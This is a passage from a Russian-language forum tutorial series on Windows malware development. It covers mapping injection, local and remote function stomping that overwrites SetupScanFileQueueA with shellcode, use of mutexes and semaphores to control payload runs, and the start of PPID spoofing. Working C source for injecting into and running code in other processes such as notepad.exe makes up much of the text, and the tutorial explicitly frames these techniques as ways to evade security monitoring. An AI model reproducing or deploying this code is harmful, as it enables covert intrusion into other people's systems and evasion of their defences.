    if (hFile == NULL) {
        printf(&quot;\t[!] CreateFileMapping Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        printf(&quot;\t[!] MapViewOfFile Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    memcpy(pMapLocalAddress, pPayload, sPayloadSize);

    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pMapRemoteAddress == NULL) {
        printf(&quot;\t[!] MapViewOfFile2 Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf(&quot;\t[+] Remote Mapping Address : 0x%p \n&quot;, pMapRemoteAddress);

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>UnmapViewOfFile</b><br />
<br />
Напомним, что UnmapViewOfFile требует только базовый адрес отображаемого представления файла, который должен быть деактивирован.<br />
Вызов WinAPI UnmapViewOfFile для отображения локально отображаемой полезной нагрузки запрещен, когда полезная нагрузка все еще выполняется, потому что удалённое представление файла является отражением локального.<br />
<b>Таким образом, деактивация локального представления файла вызовет сбой удалённого процесса, так как полезная нагрузка все еще активна.<br />
<br />
<b>Демо</b> </b><br />
<br />
Целевой процесс для этой демонстрации — Notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783420331.png"
		data-src="https://osint42.org/attachments/1746783420331-png.146/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783420331-png.146/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783420331.png"
			title="1746783420331.png"
			width="1347" height="718" loading="lazy" />
	</div><br />
<br />
Ниже представлено изображение, на котором показана локально отображенная память, содержащая полезную нагрузку. Обратите внимание, что разрешения на память установлены как RW (чтение и запись).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783428572.png"
		data-src="https://osint42.org/attachments/1746783428572-png.147/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783428572-png.147/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783428572.png"
			title="1746783428572.png"
			width="1786" height="784" loading="lazy" />
	</div><br />
<br />
MapViewOfFile2 отображает те же байты в адресное пространство целевого процесса, notepad.exe. Удаленно отображенная память теперь содержит полезную нагрузку с разрешениями RWX (чтение, запись и выполнение).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783436428.png"
		data-src="https://osint42.org/attachments/1746783436428-png.148/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783436428-png.148/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783436428.png"
			title="1746783436428.png"
			width="1780" height="814" loading="lazy" />
	</div><br />
<br />
Выполнение полезной нагрузки (используя CreateRemoteThread для простоты)<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783442653.png"
		data-src="https://osint42.org/attachments/1746783442653-png.149/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783442653-png.149/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783442653.png"
			title="1746783442653.png"
			width="1672" height="792" loading="lazy" />
	</div></div>
						

							<h2>Изучаем технику Stomping Injection</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746783529135.png"
		data-src="https://osint42.org/attachments/1746783529135-png.150/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783529135-png.150/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783529135.png"
			title="1746783529135.png"
			width="1353" height="962" loading="lazy" />
	</div><br />
<br />
Предыдущая статья показывала как запустить peyload и при этом избежать использования вызовов WinAPI VirtualAlloc/Ex.<br />
<br />
Этот-же урок демонстрирует другой метод, который избегает использования этих WinAPI.<br />
<br />
Термин &quot;stomping&quot; относится к действию перезаписи или замены памяти функции или другой структуры данных в программе другими данными.<br />
<br />
<b>&quot;Function stomping&quot;</b> - это техника, при которой байты исходной функции заменяются новым кодом, в результате чего функция заменяется или больше не работает так, как предполагалось. Вместо этого функция будет выполнять другую логику. Для реализации этого требуется адрес жертвенной функции для &quot;stomping&quot;.<br />
<br />
<b>Выбор целевой функции</b><br />
<br />
Получение адреса функции, если она локальная, то это не сложно, но основной вопрос при этой технике - какая функция получается.<br />
Перезапись часто используемой функции может привести к неконтролируемому выполнению полезной нагрузки или процесс может завершиться аварийно. Поэтому следует понимать, что нацеливание на функции, экспортируемые из ntdll.dll, kernel32.dll и kernelbase.dll, рискованно.<br />
Вместо этого следует нацеливаться на менее часто используемые функции, такие как MessageBox, так как она редко используется операционной системой или другими приложениями.<br />
<br />
<b>Использование перезаписанной функции</b><br />
<br />
Когда байты целевой функции заменяются на байты полезной нагрузки, функция больше не может быть использована, если это не предназначено специально для выполнения полезной нагрузки.<br />
Например, если целевой функцией является MessageBoxA, то двоичный файл должен вызывать MessageBoxA только один раз, когда будет выполнена полезная нагрузка.<br />
<br />
<b>Локальный код функции Stomping</b><br />
<br />
В демонстрации кода ниже, целевой функцией является SetupScanFileQueueA. Это совершенно случайная функция, но вряд ли она вызовет проблемы, если ее перезаписать.<br />
Согласно документации Microsoft, функция экспортируется из Setupapi.dll. Поэтому первым шагом будет загрузка Setupapi.dll в локальную память процесса с использованием LoadLibraryA, а затем получение адреса функции с помощью GetProcAddress.<br />
<br />
Следующим шагом будет &quot;stomping&quot; функции и замена её полезной нагрузкой. Убедитесь, что функция может быть перезаписана, пометив её область памяти как доступную для чтения и записи с использованием VirtualProtect.<br />
Затем полезная нагрузка записывается по адресу функции, и, наконец, снова используется VirtualProtect, чтобы пометить область как исполняемую (RX или RWX).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define        SACRIFICIAL_DLL          &quot;setupapi.dll&quot;
#define        SACRIFICIAL_FUNC         &quot;SetupScanFileQueueA&quot;
// ...

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    DWORD    dwOldProtection        = NULL;

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &amp;dwOldProtection)){
        printf(&quot;[!] VirtualProtect [RW] Не удалось из-за ошибки: %d \n&quot;, GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect [RWX] Не удалось из-за ошибки: %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main() {

    PVOID        pAddress    = NULL;
    HMODULE        hModule        = NULL;
    HANDLE        hThread        = NULL;

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы загрузить \&quot;%s\&quot; ... &quot;, SACRIFICIAL_DLL);
    getchar();

    printf(&quot;[i] Загрузка ... &quot;);
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL){
        printf(&quot;[!] LoadLibraryA Не удалось из-за ошибки: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);

    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL){
        printf(&quot;[!] GetProcAddress Не удалось из-за ошибки: %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[+] Адрес \&quot;%s\&quot; : 0x%p \n&quot;, SACRIFICIAL_FUNC, pAddress);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;[i] Запись ... &quot;);
    if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
        return -1;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выполнить полезную нагрузку ... &quot;);
    getchar();

    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
    getchar();

    return 0;

}</code></pre>
	</div>
</div><br />
<b>Вставка DLL в двоичный файл</b><br />
<br />
Вместо загрузки DLL с использованием LoadLibrary и затем получения адреса целевой функции с помощью GetProcAddress, можно статически связать DLL с двоичным файлом. Для этого можно использовать директиву компилятора pragma comment, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma comment (lib, &quot;Setupapi.lib&quot;) // Добавление &quot;setupapi.dll&quot; в таблицу импорта адресов</code></pre>
	</div>
</div><br />
Затем целевую функцию можно просто получить с использованием оператора адреса (например, &amp;SetupScanFileQueueA). Ниже приведен фрагмент кода, который обновляет предыдущий фрагмент кода с использованием директивы pragma comment.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma comment (lib, &quot;Setupapi.lib&quot;) // Добавление &quot;setupapi.dll&quot; в таблицу импорта адресов
// ...

int main() {

    HANDLE        hThread            = NULL;

    printf(&quot;[+] Адрес \&quot;SetupScanFileQueueA\&quot; : 0x%p \n&quot;, &amp;SetupScanFileQueueA);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;[i] Запись ... &quot;);
    if (!WritePayload(&amp;SetupScanFileQueueA, Payload, sizeof(Payload))) { // Использование оператора адреса
        return -1;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выполнить полезную нагрузку ... &quot;);
    getchar();

    hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
    getchar();

    return 0;

}</code></pre>
	</div>
</div><br />
<b>Демонстрация</b><br />
<br />
Получение адреса SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783550140.png"
		data-src="https://osint42.org/attachments/1746783550140-png.151/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783550140-png.151/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783550140.png"
			title="1746783550140.png"
			width="1353" height="962" loading="lazy" />
	</div><br />
<br />
Оригинальные байты функции SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783559906.png"
		data-src="https://osint42.org/attachments/1746783559906-png.152/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783559906-png.152/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783559906.png"
			title="1746783559906.png"
			width="1419" height="924" loading="lazy" />
	</div><br />
<br />
Замена байтов функции на полезную нагрузку Msfvenom calc.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783567521.png"
		data-src="https://osint42.org/attachments/1746783567521-png.153/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783567521-png.153/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783567521.png"
			title="1746783567521.png"
			width="1217" height="771" loading="lazy" />
	</div><br />
<br />
Запуск нагрузки<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783574451.png"
		data-src="https://osint42.org/attachments/1746783574451-png.154/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783574451-png.154/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783574451.png"
			title="1746783574451.png"
			width="1455" height="844" loading="lazy" />
	</div><br />
<br />
<b>Stomping Injection в удаленный процесс</b><br />
Давайте теперь попробуем перезаписать функцию в стороннем процессе.)<br />
<br />
DLL-файлы, реализующие функции Windows API, используются всеми процессами, которые их используют, поэтому функции внутри DLL имеют одинаковые адреса в каждом процессе. Однако адрес самой DLL будет отличаться между процессами из-за различного виртуального адресного пространства. Это означает, что, хотя адрес целевой функции остается постоянным в разных процессах, DLL, который экспортирует эти функции, может не быть одинаковым.<br />
<br />
Например, два процесса, A и B, будут использовать Kernel32.dll, но адрес DLL может отличаться в каждом процессе из-за рандомизации макета адресного пространства (Address Space Layout Randomization). Однако VirtualAlloc, который экспортируется из Kernel32.dll, будет иметь одинаковый адрес в обоих процессах.<br />
<br />
Важно отметить, что для того чтобы перезаписать функцию удаленно, DLL, экспортирующая целевую функцию, должна быть уже загружена в целевой процесс.<br />
Например, чтобы нацелиться на функцию SetupScanFileQueueA, которая экспортируется из Setupapi.dll, <b>этот DLL должен быть уже загружен в целевой процесс. </b><br />
<br />
Если удаленный процесс не загрузил Setupapi.dll, функция SetupScanFileQueueA не будет присутствовать в целевом процессе, что приведет к попытке записи по адресу, который не существует.<br />
<br />
<b>Код перезаписи функции в удаленном процессе</b><br />
<br />
Следующий код похож на код локальной перезаписи функции, однако он использует разные функции WinAPI для инъекции кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define        SACRIFICIAL_DLL            &quot;setupapi.dll&quot;
#define        SACRIFICIAL_FUNC           &quot;SetupScanFileQueueA&quot;
// ...

BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {

    DWORD    dwOldProtection            = NULL;
    SIZE_T    sNumberOfBytesWritten      = NULL;

    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtectEx [RW] Ошибка выполнения: %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten){
        printf(&quot;[!] WriteProcessMemory Ошибка выполнения: %d \n&quot;, GetLastError());
        printf(&quot;[!] Байты записаны: %d из %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtectEx [RWX] Ошибка выполнения: %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

    HANDLE        hProcess        = NULL,
                hThread            = NULL;
    PVOID        pAddress        = NULL;
    DWORD        dwProcessId        = NULL;

    HMODULE        hModule            = NULL;

    if (argc &lt; 2) {
        wprintf(L&quot;[!] Использование : \&quot;%s\&quot; &lt;Имя процесса&gt; \n&quot;, argv[0]);
        return -1;
    }

    wprintf(L&quot;[i] Поиск ID процесса \&quot;%s\&quot; ... &quot;, argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &amp;dwProcessId, &amp;hProcess)) {
        printf(&quot;[!] Процесс не найден \n&quot;);
        return -1;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;[i] Найденный PID целевого процесса: %d \n&quot;, dwProcessId);



    printf(&quot;[i] Загрузка \&quot;%s\&quot;... &quot;, SACRIFICIAL_DLL);
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL) {
        printf(&quot;[!] LoadLibraryA Ошибка выполнения: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);


    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL) {
        printf(&quot;[!] GetProcAddress Ошибка выполнения: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] Адрес \&quot;%s\&quot; : 0x%p \n&quot;, SACRIFICIAL_FUNC, pAddress);


    printf(&quot;[#] Нажмите &lt;Enter&gt; для записи полезной нагрузки ... &quot;);
    getchar();
    printf(&quot;[i] Запись ... &quot;);
    if (!WritePayload(hProcess, pAddress, Payload, sizeof(Payload))) {
        return -1;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);



    printf(&quot;[#] Нажмите &lt;Enter&gt; для выполнения полезной нагрузки ... &quot;);
    getchar();

    hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf(&quot;[#] Нажмите &lt;Enter&gt; чтобы выйти ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Демонстрация</b><br />
<br />
Нацеливаемся на процесс Notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783589203.png"
		data-src="https://osint42.org/attachments/1746783589203-png.155/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783589203-png.155/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783589203.png"
			title="1746783589203.png"
			width="1195" height="598" loading="lazy" />
	</div><br />
<br />
Получение адреса SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783595609.png"
		data-src="https://osint42.org/attachments/1746783595609-png.156/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783595609-png.156/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783595609.png"
			title="1746783595609.png"
			width="1329" height="808" loading="lazy" />
	</div><br />
<br />
Оригинальные байты функции SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783607243.png"
		data-src="https://osint42.org/attachments/1746783607243-png.157/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783607243-png.157/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783607243.png"
			title="1746783607243.png"
			width="1358" height="640" loading="lazy" />
	</div><br />
<br />
Замена байтов функции на полезную нагрузку Msfvenom calc.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783618322.png"
		data-src="https://osint42.org/attachments/1746783618322-png.158/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783618322-png.158/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783618322.png"
			title="1746783618322.png"
			width="1296" height="564" loading="lazy" />
	</div><br />
<br />
Запуск нагрузки<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783624461.png"
		data-src="https://osint42.org/attachments/1746783624461-png.159/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783624461-png.159/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783624461.png"
			title="1746783624461.png"
			width="1568" height="877" loading="lazy" />
	</div></div>
						

							<h2>Контроль выполнения полезной нагрузки</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746783836965.png"
		data-src="https://osint42.org/attachments/1746783836965-png.160/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783836965-png.160/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783836965.png"
			title="1746783836965.png"
			width="1538" height="729" loading="lazy" />
	</div><br />
<br />
В реальных сценариях важно ограничивать действия, выполняемые вредоносным ПО, и концентрироваться на основных задачах.<br />
Чем больше действий выполняет вредоносное ПО, тем вероятнее, что его обнаружат системы мониторинга.<br />
<br />
Вот например такая ситуация, как в этом уроке, правилом хорошего тона перед перезаписью атакуемой функции, необходимо сохранить оригинал, а потом после выполнения полезной нагрузки восстановить функцию.<br />
<br />
Но для этого нужно знать, что полезная нагрузка выполнилась.)<br />
<br />
Объекты синхронизации Windows могут быть использованы для управления выполнением полезной нагрузки. Эти объекты координируют доступ к общим ресурсам для нескольких потоков или процессов, обеспечивая контролируемый доступ к общим ресурсам и предотвращая конфликты или состояния гонки, когда несколько потоков или процессов пытаются одновременно получить доступ к одному и тому же ресурсу. Используя объекты синхронизации, можно контролировать, сколько раз полезная нагрузка будет выполнена на системе.<br />
<br />
Существует несколько типов объектов синхронизации, включая семафоры, мьютексы и события. Каждый тип объекта синхронизации работает несколько иначе, но в конечном итоге все они служат одной цели - координировать доступ к общим ресурсам.<br />
<br />
<b>Семафоры</b><br />
<br />
Семафоры - это инструменты синхронизации, которые используют значение, хранящееся в памяти, для контроля доступа к общему ресурсу. Существует два типа семафоров: бинарные и счетные.<br />
<br />
<b>Бинарный семафор</b> имеет значение 1 или 0, указывая, доступен ли ресурс или недоступен соответственно. <b>Счетный семафор</b>, с другой стороны, имеет значение больше 1, представляя количество доступных ресурсов или количество процессов, которые могут одновременно получать доступ к ресурсу.<br />
<br />
Для управления выполнением полезной нагрузки при каждом выполнении полезной нагрузки будет создаваться именованный объект семафора. Если двоичный файл выполняется несколько раз, первое выполнение создаст именованный семафор, и полезная нагрузка будет выполнена, как предполагалось. При последующих запусках создание семафора не удастся, так как семафор с таким же именем уже работает. Это указывает на то, что полезная нагрузка в настоящее время выполняется из предыдущего запуска и поэтому не должна выполняться снова, чтобы избежать дублирования.<br />
<br />
CreateSemaphoreA будет использоваться для создания объекта семафора. Важно создать его как именованный семафор, чтобы предотвратить выполнение после первоначального запуска двоичного файла. Если именованный семафор уже работает, CreateSemaphoreA вернет дескриптор существующего объекта, и GetLastError вернет ERROR_ALREADY_EXISTS.<br />
<br />
В приведенном ниже коде, если семафор &quot;ControlString&quot; уже работает, GetLastError вернет ERROR_ALREADY_EXISTS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, &quot;ControlString&quot;);

if (hSemaphore != NULL &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS)
    // Полезная нагрузка уже выполняется
else
    // Полезная нагрузка не выполняется</code></pre>
	</div>
</div><br />
<b>Мьютексы</b><br />
<br />
Мьютекс, сокращенно от &quot;взаимного исключения&quot;, - это инструмент синхронизации, используемый для управления доступом к общим ресурсам среди процессов и потоков. На практике поток, пытающийся получить доступ к общему ресурсу, проверяет статус мьютекса. Если он заблокирован, поток ждет, пока мьютекс не будет разблокирован. Если мьютекс не заблокирован, поток блокирует его, выполняет необходимые операции с общим ресурсом и затем разблокирует мьютекс по завершении. Это обеспечивает доступ к общему ресурсу только одного потока за раз, предотвращая конфликты и порчу данных.<br />
<br />
CreateMutexA используется для создания именованного мьютекса следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hMutex = CreateMutexA(NULL, FALSE, &quot;ControlString&quot;);

if (hMutex != NULL &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS)
    // Полезная нагрузка уже выполняется
else
    // Полезная нагрузка не выполняется</code></pre>
	</div>
</div><br />
<b>События</b><br />
<br />
События - это еще один инструмент синхронизации, который может быть использован для координации выполнения потоков или процессов. Они могут быть ручными или автоматическими, причем ручные события требуют явных действий по установке или сбросу, а автоматические события активируются внешними условиями, такими как истечение времени таймера или завершение задачи.<br />
<br />
Для использования событий в программе может быть использована функция WinAPI CreateEventA. Использование функции демонстрируется ниже:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, &quot;ControlString&quot;);

if (hEvent != NULL &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS)
    // Полезная нагрузка уже выполняется
else
    // Полезная нагрузка не выполняется</code></pre>
	</div>
</div><br />
<b><u>Хочется отметить что выше код использует не совсем правильно объекты синхронизации, а призван лишь для демонстрации, для большего понимания как с ними работать, рекомендуется обратится либо к документации Microsoft, либо поискать статьи по объектам синхронизации.</u></b><br />
<br />
Вот например семафоры, нужно использовать с событиями:WaitForSingleObject (Потоки ожидают доступа к разделяемому ресурсу).<br />
А для работы мьютексами например обычно используют функции захвата и освобождения мьютекса.<br />
<br />
Изучить эти темы предлагаю самостоятельно, т.к. материала очень много по этой части.)</div>
						

							<h2>Изучаем технику Spoofing</h2>

							

							

							<div class="bbWrapper">Spoofing - В переводе подмена.)<br />
<br />
<b>Рассмотрим несколько вариантов техники:<br />
Подмена номера родительского процесса (PPID)</b><br />
<br />
Это техника, используемая для изменения PPID процесса, что позволяет эффективно маскировать связь между дочерним процессом и его истинным родительским процессом. Это можно сделать, изменив PPID дочернего процесса на другое значение, заставив его выглядеть так, как будто процесс был запущен другим законным процессом Windows, а не истинным родительским процессом.<br />
<br />
Решения безопасности и защитники часто ищут необычные отношения между родителем и ребенком. Например, если Microsoft Word запускает cmd.exe, это обычно указывает на выполнение злонамеренных макросов. <b>Если cmd.exe запускается с другим PPID, он скроет истинный родительский процесс и будет выглядеть так, как будто он был запущен другим процессом.</b><br />
<br />
Вот например в статье про APC, RuntimeBroker.exe был запущен  родителем EarlyBird.exe, что может использоваться решениями безопасности для обнаружения злонамеренной активности.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783972655.png"
		data-src="https://osint42.org/attachments/1746783972655-png.161/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783972655-png.161/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783972655.png"
			title="1746783972655.png"
			width="1332" height="754" loading="lazy" />
	</div><br />
<br />
<b>Список атрибутов</b><br />
<br />
Список атрибутов — это структура данных, которая хранит список атрибутов, связанных с процессом или потоком. К этим атрибутам могут относиться такие сведения, как приоритет, алгоритм планирования, состояние, привязка к ЦП, адресное пространство памяти процесса или потока и многое другое. Списки атрибутов могут использоваться для эффективного хранения и извлечения информации о процессах и потоках, а также для изменения атрибутов процесса или потока в реальном времени.<br />
<br />
Для PPID Spoofing требуется использование и изменение списка атрибутов процесса для модификации его PPID. Использование и изменение списка атрибутов процесса будут показаны в следующих разделах.<br />
<br />
<b>Создание процесса</b><br />
<br />
Процесс подмены PPID требует создания процесса с использованием CreateProcess с установленным флагом EXTENDED_STARTUPINFO_PRESENT, который используется для дополнительного контроля созданного процесса. Этот флаг позволяет изменять некоторую информацию о процессе, такую как информацию PPID.<br />
<br />
Документация Microsoft по EXTENDED_STARTUPINFO_PRESENT гласит следующее:<br />
<br />
Процесс создается с расширенной информацией о запуске; параметр lpStartupInfo определяет структуру STARTUPINFOEX.<br />
<br />
Это означает, что также необходима структура данных STARTUPINFOEXA.<br />
<br />
<b>Структура STARTUPINFOEXA</b><br />
<br />
Структура данных STARTUPINFOEXA представлена ниже:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; // Список атрибутов
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;</code></pre>
	</div>
</div><br />
